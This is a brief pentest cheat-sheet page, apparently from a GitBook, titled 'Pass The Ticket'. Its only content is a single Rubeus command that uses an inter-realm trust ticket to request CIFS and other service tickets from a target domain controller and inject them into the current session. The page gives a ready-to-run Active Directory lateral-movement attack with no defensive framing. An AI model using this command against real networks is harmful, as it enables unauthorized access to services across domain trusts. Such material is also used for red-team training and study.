# Pass The Ticket

### Use a Inter-Realm tgt

{% code overflow="wrap" %}
```powershell
./Rubeus.exe asktgs /ticket:./trust_tkt.kirbi /service:cifs/<TARGET MACHINE>,<OTHER SERVICES> /dc:<TARGET DOMAIN DC> /ptt
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/Pasted image 20231113155312.png" alt=""><figcaption></figcaption></figure>

